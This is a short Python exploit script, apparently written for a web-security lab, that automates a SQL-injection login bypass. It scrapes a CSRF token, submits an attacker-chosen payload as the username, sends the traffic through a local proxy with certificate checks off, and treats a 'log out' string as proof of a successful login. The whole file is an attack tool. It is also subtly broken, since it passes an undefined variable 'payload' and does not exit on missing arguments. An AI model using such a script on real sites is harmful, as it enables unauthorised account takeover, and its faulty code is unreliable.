import sys
import requests
import urllib3
from bs4 import BeautifulSoup 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies= {"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}

def get_csrf_token(s,url):
    res = s.get(url,verify=False,proxies=proxies)
    soup = BeautifulSoup(res.text,'html.parser')
    csrf=soup.find("input")["value"]
    return csrf

def exploit_sqli(s,url,payload):
    csrf=get_csrf_token(s,url)
    data={"csrf":csrf,"username":payload,"password":"12345678"}
    r=s.post(url,data=data,verify=False,proxies=proxies)
    ras=r.text
    if "log out" in ras:
        return True
    else:
        return False


if __name__== "__main__":
    try:
        url=sys.argv[1].strip()
        sqli_payload=sys.argv[2].strip()
    except IndexError:
        print("use the below bash command on your terminal")
        print("use python3 file.py <url> <sql payload>")
    s=requests.Session()
    if exploit_sqli(s,url,payload):
        print("the sql injetion is successful we have logged in")
    else:
        print("the sql injection is not successful we are not logged in")